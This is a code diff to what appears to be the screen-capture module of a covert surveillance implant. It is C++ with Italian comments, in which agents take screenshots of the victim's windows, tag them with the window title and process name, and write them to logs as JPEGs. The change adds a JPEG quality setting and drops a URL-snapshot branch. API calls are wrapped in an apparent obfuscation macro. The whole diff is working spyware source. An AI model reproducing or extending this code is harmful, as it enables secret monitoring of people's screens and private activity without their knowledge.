@@ -56,7 +56,7 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
    return -1;  // Failure
 }
 
-BYTE *JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst)
+BYTE *JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD quality)
 {
 	HGLOBAL hBuffer = NULL, hBufferDst = NULL;
 	void *pBuffer = NULL, *pBufferDst = NULL;
@@ -66,6 +66,7 @@ BYTE *JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst)
 	ULONG_PTR gdiplusToken;
 	CLSID   encoderClsid;
 	Image *image = NULL;
+	EncoderParameters encoderParameters;
 
 	if (!sizeDst)
 		return NULL;
@@ -83,6 +84,12 @@ BYTE *JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst)
 		CoUninitialize();
 		return NULL;
 	}
+
+   encoderParameters.Count = 1;
+   encoderParameters.Parameter[0].Guid = EncoderQuality;
+   encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
+   encoderParameters.Parameter[0].NumberOfValues = 1;
+   encoderParameters.Parameter[0].Value = &quality;
 
     hBuffer = GlobalAlloc(GMEM_MOVEABLE, imageSize);
 	if (!hBuffer) {
@@ -107,7 +114,7 @@ BYTE *JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst)
 			if (hBufferDst = GlobalAlloc(GMEM_MOVEABLE, imageSize)) {
 				if (pBufferDst = GlobalLock(hBufferDst)) {
 					if (FNC(CreateStreamOnHGlobal)(hBufferDst, FALSE, &pStreamDst) == S_OK) {
-						if (image->Save(pStreamDst, &encoderClsid, NULL) == Ok) {							
+						if (image->Save(pStreamDst, &encoderClsid, &encoderParameters) == Ok) {							
 							ULARGE_INTEGER position;
 							LARGE_INTEGER null_int;
 							DWORD dummy;
@@ -139,7 +146,7 @@ BYTE *JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst)
     return dataptrDst;
 }
 
-void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData)
+void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality)
 {
 	HANDLE hf;
 	BITMAPFILEHEADER bmf = { };
@@ -161,7 +168,7 @@ void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len,
 	memcpy(source_bmp+sizeof(bmf), pBMI, cbBMI);
 	memcpy(source_bmp+sizeof(bmf)+cbBMI, pData, cbData);
 
-	if (dest_jpg = JpgConvert(source_bmp, bmp_size, &jpg_size)) {
+	if (dest_jpg = JpgConvert(source_bmp, bmp_size, &jpg_size, quality)) {
 		hf = Log_CreateFile(agent_tag, additional_header, additional_len);
 		Log_WriteFile(hf, (BYTE *)dest_jpg, jpg_size);
 		Log_CloseFile(hf);				
@@ -173,7 +180,7 @@ void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len,
 
 // Esegue uno snpashot dello schermo
 // Questa funzione e' usata anche dall'agente URL 
-void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD agent_tag, url_info_struct *url_info)
+void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD quality)
 {
 	HDC hdccap = 0, g_hScrDC = 0;
 	HBITMAP hbmcap = 0;
@@ -300,63 +307,35 @@ void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD agent_tag, url_info_str
 		if (HM_SafeGetWindowTextW(grabwind, (LPWSTR)svTitle, SMLSIZE-2) == 0)
 			wsprintfW((LPWSTR)svTitle, L"UNKNOWN");
 
-		// Se si tratta dell'agente snapshot
-		if (agent_tag == PM_SNAPSHOTAGENT) {
-			//Prende il nome della finestra e del processo per scriverlo nell'header
-			
-			DWORD dwProcessId = 0;
-			WCHAR *proc_name = NULL;
-			SnapshotAdditionalData *snap_additional_header;
-			BYTE *log_header;
-			DWORD additional_len;
+		//Prende il nome della finestra e del processo per scriverlo nell'header
+		DWORD dwProcessId = 0;
+		WCHAR *proc_name = NULL;
+		SnapshotAdditionalData *snap_additional_header;
+		BYTE *log_header;
+		DWORD additional_len;
 
-			FNC(GetWindowThreadProcessId)(grabwind, &dwProcessId);
-			if (!dwProcessId || !(proc_name = HM_FindProcW(dwProcessId))) 
-				proc_name = wcsdup(L"UNKNOWN");
+		FNC(GetWindowThreadProcessId)(grabwind, &dwProcessId);
+		if (!dwProcessId || !(proc_name = HM_FindProcW(dwProcessId))) 
+			proc_name = wcsdup(L"UNKNOWN");
 
-			additional_len = sizeof(SnapshotAdditionalData) + wcslen(proc_name)*sizeof(WCHAR) + wcslen(svTitle)*sizeof(WCHAR);
-			log_header = (BYTE *)malloc(additional_len);
-			if (log_header) {
-				// Crea l'header addizionale
-				snap_additional_header = (SnapshotAdditionalData *)log_header;
-				snap_additional_header->uVersion = LOG_SNAP_VERSION;
-				snap_additional_header->uProcessNameLen = wcslen(proc_name)*sizeof(WCHAR);
-				snap_additional_header->uWindowNameLen = wcslen(svTitle)*sizeof(WCHAR);
-				log_header+=sizeof(SnapshotAdditionalData);
-				memcpy(log_header, proc_name, snap_additional_header->uProcessNameLen);
-				log_header+=snap_additional_header->uProcessNameLen;
-				memcpy(log_header, svTitle, snap_additional_header->uWindowNameLen);
+		additional_len = sizeof(SnapshotAdditionalData) + wcslen(proc_name)*sizeof(WCHAR) + wcslen(svTitle)*sizeof(WCHAR);
+		log_header = (BYTE *)malloc(additional_len);
+		if (log_header) {
+			// Crea l'header addizionale
+			snap_additional_header = (SnapshotAdditionalData *)log_header;
+			snap_additional_header->uVersion = LOG_SNAP_VERSION;
+			snap_additional_header->uProcessNameLen = wcslen(proc_name)*sizeof(WCHAR);
+			snap_additional_header->uWindowNameLen = wcslen(svTitle)*sizeof(WCHAR);
+			log_header+=sizeof(SnapshotAdditionalData);
+			memcpy(log_header, proc_name, snap_additional_header->uProcessNameLen);
+			log_header+=snap_additional_header->uProcessNameLen;
+			memcpy(log_header, svTitle, snap_additional_header->uWindowNameLen);
 
-				//Output su file
-				BmpToJpgLog(PM_SNAPSHOTAGENT, (BYTE *)snap_additional_header, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage);
-				SAFE_FREE(snap_additional_header);
-			}
-			SAFE_FREE(proc_name);
-		} else if (agent_tag == PM_URLAGENT_SNAP) {
-			UrlSnapAdditionalData *urlsnap_additional_header;
-			BYTE *log_header;
-			DWORD additional_len;
-
-			additional_len = sizeof(UrlSnapAdditionalData) + wcslen(url_info->url_name)*sizeof(WCHAR) + wcslen(svTitle)*sizeof(WCHAR);;
-			log_header = (BYTE *)malloc(additional_len);
-			if (log_header) {
-				// Crea l'header addizionale
-				urlsnap_additional_header = (UrlSnapAdditionalData *)log_header;
-				urlsnap_additional_header->uVersion = LOG_URLSNAP_VERSION;
-				urlsnap_additional_header->uBrowserType = url_info->uBrowserType;
-				urlsnap_additional_header->uUrlNameLen = wcslen(url_info->url_name)*sizeof(WCHAR);
-				urlsnap_additional_header->uWindowTitleLen = wcslen(svTitle)*sizeof(WCHAR);
-
-				log_header+=sizeof(UrlSnapAdditionalData);
-				memcpy(log_header, url_info->url_name, urlsnap_additional_header->uUrlNameLen);
-				log_header+=urlsnap_additional_header->uUrlNameLen;
-				memcpy(log_header, svTitle, urlsnap_additional_header->uWindowTitleLen);
-
-				//Output su file
-				BmpToJpgLog(PM_URLAGENT_SNAP, (BYTE *)urlsnap_additional_header, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage);
-				SAFE_FREE(urlsnap_additional_header);
-			}
+			//Output su file
+			BmpToJpgLog(PM_SNAPSHOTAGENT, (BYTE *)snap_additional_header, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage, quality);
+			SAFE_FREE(snap_additional_header);
 		}
+		SAFE_FREE(proc_name);
 	}
 
 	// Rilascio oggetti....
@@ -491,8 +470,7 @@ void TakeMiniSnapShot(DWORD agent_tag, HWND grabwind, int xPos, int yPos, DWORD 
 			memcpy(log_header, svTitle, mouse_additional_header->uWindowNameLen);
 
 			//Output su file
-
-			BmpToJpgLog(agent_tag, (BYTE *)mouse_additional_header, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage);
+			BmpToJpgLog(agent_tag, (BYTE *)mouse_additional_header, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage, 50);
 			SAFE_FREE(mouse_additional_header);
 		}
 		SAFE_FREE(proc_name);
